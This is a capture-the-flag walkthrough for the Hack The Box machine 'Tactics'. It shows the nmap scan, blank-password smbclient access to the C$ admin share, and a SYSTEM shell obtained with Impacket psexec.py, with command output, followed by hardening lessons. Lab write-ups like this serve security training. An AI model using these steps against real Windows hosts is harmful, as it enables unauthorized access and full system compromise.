# Hack The Box – Tactics Walkthrough  
### Prepared by: 0ne-nine9, ilinor  

---

## Introduction

Welcome to **Tactics**, a Hack The Box machine that spotlights a critical and common misconfiguration in Windows environments — improperly secured **SMB shares**! 

Windows dominates both enterprise and consumer ecosystems. While its GUI simplifies user interaction, it also hides layers of **administrative complexity** that, when misconfigured, open up severe vulnerabilities.

In this walkthrough, we'll discover two powerful exploitation paths:
1. A quiet, clean SMB share read to retrieve the flag.
2. A loud and proud SYSTEM shell using **Impacket's `psexec.py`**!

This box perfectly demonstrates how poor security hardening and exposure of built-in Windows mechanisms can lead to **SYSTEM-level compromise**.

---

## Enumeration

### Step 1: Initial Nmap Scan

Use `nmap` with the `-Pn` flag — a stealthy approach ignoring host discovery pings to bypass basic firewalls!

```bash
nmap -Pn -sC -p- -oA nmap/tactics 10.10.10.131
```

- `-Pn`: Skip ping — treat target as online
- `-sC`: Default scripts
- `-p-`: Scan all ports

 Output reveals:

```text
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

**Finding:** **RPC**, **NetBIOS**, and **SMB** are exposed—core Windows remote management and file-sharing surfaces. Continue with targeted SMB/RPC enumeration.

---

## SMB Exploration

### Step 2: Use `smbclient` to Enumerate Shares

```bash
smbclient -L \\10.10.10.131 -U Administrator
```

Hit ENTER when prompted for a password (we’re testing for blank creds).

 Success! We see shares like:

- `ADMIN$`
- `C$`

These are administrative shares — and C$ is a full disk share!

Connect with:

```bash
smbclient \\\\10.10.10.131\\C$ -U Administrator
```

No password needed again — and we’re inside the file system. It’s **wide open!** 

---

## Foothold – Option A: Quiet Method Using `smbclient`

### Goal: Get the user flag

Navigate to the expected flag path:

```bash
cd Users\Administrator\Desktop
dir
```

Spot `flag.txt`?

Grab it:

```bash
get flag.txt
```

Now locally:

```bash
cat flag.txt
```

 FLAG CAPTURED! All through quiet SMB access. No malware, no tools, just native protocol misconfiguration.

---

## Foothold – Option B: SYSTEM Shell Using Impacket's `psexec.py`

If you want a full shell, let’s pivot to **Impacket** — a powerful Python framework for network protocol manipulation.

### Step 1: Clone and Install Impacket

```bash
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip3 install .
# or:
sudo python3 setup.py install
pip3 install -r requirements.txt
```

Make sure Python 3 is installed:

```bash
sudo apt install python3 python3-pip
```

---

### Step 2: Run `psexec.py`

With valid ADMIN SMB access (blank password!), execute:

```bash
python3 examples/psexec.py Administrator@10.10.10.131
```

Password? Just hit ENTER.

 BAM! You’re in:

```text
[*] SMBv3.0 dialect used
[*] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>
```

And check this:

```bash
whoami
```

Output:

```text
nt authority\system
```

 SYSTEM SHELL ACQUIRED!

Now navigate:

```bash
cd \Users\Administrator\Desktop
dir
type flag.txt
```

Flag obtained — again — this time from **SYSTEM context**.

---

## Impacket’s `psexec.py` – How It Works

- Authenticates via SMB (port 445)
- Uploads an executable to `ADMIN$`
- Registers it as a service
- Executes it
- You get a SYSTEM-level shell

 **Note:** It’s noisy! Windows Defender and EDRs love detecting this behavior. Great in labs — *not stealthy in the real world*.

---

## Summary of Attack Paths

### Path A – Silent Approach:

```bash
smbclient \\\\10.10.10.131\\C$ -U Administrator
```

-  No tools
-  Quiet and stealthy
-  No password protection on ADMIN shares

---

### Path B – Aggressive Interactive Shell:

```bash
python3 psexec.py Administrator@10.10.10.131
```

-  Full SYSTEM shell
-  Useful for further post-exploitation
-  Easily detected by AV/EDR

---

## Lessons Learned

- **Default Windows shares** (like `ADMIN$` and `C$`) are powerful entry points if not locked down
- Always test for **null SMB sessions**
- **Impacket** is your best friend in AD and Windows enumeration
- Know when to be loud, and when to be quiet — stealth is a skill

---

## Mission Complete

-  Port Scanning and SMB Enumeration  
-  Unauthorized access to admin shares  
-  File retrieval via `smbclient`  
-  SYSTEM shell via Impacket `psexec.py`  
-  Flag secured  
-  Knowledge gained

 Real-world takeaway? NEVER leave ADMIN shares open — they’re a goldmine. Harden your Windows hosts, audit SMB access, and monitor privileged actions.

 On to the next one, hacker!
